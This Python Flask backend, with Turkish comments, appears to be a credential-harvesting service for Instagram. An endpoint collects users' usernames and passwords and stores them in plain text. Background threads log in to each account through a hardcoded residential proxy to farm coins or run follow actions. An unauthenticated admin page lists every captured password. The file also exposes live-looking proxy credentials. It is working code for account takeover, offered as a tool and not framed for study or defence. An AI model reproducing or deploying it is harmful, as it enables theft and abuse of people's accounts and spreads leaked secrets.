import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY - HIZLI BAĞLANTI İÇİN TEK SATIR
PROXY_URL = "http://pcUjiruWbB:PC_4gAMh8pCXyTQAxKW1@residential.proxy-cheap.com:6000"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

def fast_login(username, password):
    with app.app_context():
        user_record = IGUser.query.filter_by(username=username).first()
        cl = Client()
        try:
            # 1. PROXY AYARLA (HIZLI)
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 10  # 10 saniyede cevap gelmezse patlat
            
            # 2. DİREKT GİRİŞ
            user_record.status = "Giriş Deneniyor..."
            db.session.commit()
            
            if cl.login(username, password):
                user_record.status = "AKTİF ✅ (COIN KASIYOR)"
                db.session.commit()
                # Burada takip komutunu hemen çalıştırabilirsin
            else:
                user_record.status = "Şifre Yanlış ❌"
                db.session.commit()
        except Exception as e:
            # Proxy veya Instagram hatası durumunda saniyeler içinde durumu güncelle
            user_record.status = "Bağlantı Hatası/Blok ⚠️"
            db.session.commit()
            print(f"Hata: {e}")

# --- API VE PANEL ---
@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p; user.status = "Sıraya Alındı..."
    db.session.commit()
    
    # THREAD BAŞLAT (Asla bloklamaz)
    t = threading.Thread(target=fast_login, args=(u, p))
    t.daemon = True # Uygulama kapanırsa thread de kapansın, asılı kalmasın
    t.start()
    
    return jsonify(status="success", msg="Sistem başlatıldı. 10 saniye içinde paneli yenileyin.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>CANLI TAKİP PANELİ</h2><table border='1'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
